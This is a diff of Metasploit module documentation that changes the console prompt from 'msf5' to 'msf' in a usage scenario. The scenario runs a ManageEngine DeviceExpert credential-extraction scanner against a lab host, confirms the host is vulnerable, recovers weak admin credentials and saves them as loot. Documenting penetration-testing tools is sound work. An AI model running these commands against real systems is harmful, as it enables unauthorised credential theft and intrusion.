@@ -31,13 +31,13 @@
 ## Scenarios
 
   ```
-  msf5 > use auxiliary/scanner/http/manageengine_deviceexpert_user_creds 
-  msf5 auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > set rhosts 172.16.158.131
+  msf > use auxiliary/scanner/http/manageengine_deviceexpert_user_creds 
+  msf auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > set rhosts 172.16.158.131
   rhosts => 172.16.158.131
-  msf5 auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > check
+  msf auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > check
   [+] 172.16.158.131:6060 - The target is vulnerable.
   [*] Checked 1 of 1 hosts (100% complete)
-  msf5 auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > run
+  msf auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > run
 
   [*] 172.16.158.131:6060 - Found weak credentials (admin:admin)
 
@@ -51,7 +51,7 @@
   [*] Credentials saved in: /Users/jvazquez/.msf4/loot/20140926165907_default_172.16.158.131_manageengine.dev_118155.txt
   [*] Scanned 1 of 1 hosts (100% complete)
   [*] Auxiliary module execution completed
-  msf5 auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > creds 172.16.158.131
+  msf auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > creds 172.16.158.131
   Credentials
   ===========
 
